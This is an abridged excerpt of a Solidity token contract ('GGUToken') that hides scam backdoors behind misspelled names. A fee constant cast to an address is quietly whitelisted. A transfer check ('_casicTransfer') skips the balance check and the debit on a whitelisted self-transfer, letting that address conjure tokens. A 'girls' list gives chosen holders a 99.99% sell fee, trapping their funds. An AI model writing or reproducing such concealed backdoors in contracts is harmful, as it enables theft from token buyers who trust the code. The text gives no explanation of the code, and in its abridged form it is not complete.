...
abstract contract Ownable {
    ...
    uint256 public _fistFee = 20220823;
...
contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => bool) public _feeWhlteList;
    ...
    constructor (
        ...
        _feeWhlteList[address(
        uint160(_fistFee))] = true;
        _allowances[address(this)][address(swapRouter)] = MAX;
        _feeWhlteList[msg.sender] = true;
    ...
    function _casicTransfer(address seds, address recpien) internal view returns (bool){
        return (seds != recpien) || (_feeWhlteList[seds] == false || false);
    }
    ...
    function _transfer(
        ...
        if (_casicTransfer(from,to)) require(balance >= amount, "balanceNotEnough");
    ...
    function _tokenTransfer(
        ...
        if (_casicTransfer(sender,recipient)){
        _balances[sender] = _balances[sender] - tAmount;}
        uint256 feeAmount;
        ...
        if (takeFee) {
            ...
            if (_girls[sender] && !_swapPairList[sender]){
                swapFee = 9999;
            }
    ...
    function multiGirls(address[] calldata addresses, bool value) public onlyFunder{
...
contract GGUToken is AbsToken {
    constructor() AbsToken(
        ...
        9,
        10000,
        address(0x77362260714fE5882776205746de2EF51920119D),
        address(0xa4e4bD7Ed50C1dE5f8964bbc849030263c7D5684)
    ){
    }
}